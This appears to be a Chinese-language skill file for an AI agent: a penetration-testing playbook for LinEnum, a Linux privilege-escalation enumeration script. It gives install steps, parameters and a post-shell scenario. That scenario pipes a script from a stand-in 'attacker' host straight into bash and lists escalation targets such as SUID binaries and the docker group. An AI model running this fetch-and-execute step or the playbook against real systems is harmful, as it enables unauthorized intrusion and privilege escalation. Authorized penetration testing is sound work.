---
name: linenum-privesc-scan
description: 渗透工具 skill:LinEnum 的安装、参数速查与攻击场景 playbook。当任务涉及 Linux本地提权 需要调用 LinEnum 时使用。
---

# LinEnum

- 攻击大类:C16 Linux本地提权
- 上游仓库:https://github.com/rebootuser/LinEnum
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
curl -o LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./LinEnum.sh -t` |  thorough 全面枚举 |
| `-r report -e /tmp/` | 导出结果 |
| `-k keyword` | 高亮关键字 |
| `-s` | 仅当前用户级(免 root 也能跑) |

## 攻击场景 Playbook

### 拿 shell 后系统枚举

```bash
curl -s http://attacker/LinEnum.sh | bash -s -- -t -r enum -e /tmp/
# 重点看: SUID/Cron/可写 service/NFS no_root_squash/docker 组
```

## 注意事项

输出按颜色分级(红=高危);现代替代是 linpeas,但 LinEnum 零依赖单文件适合最小化落地。
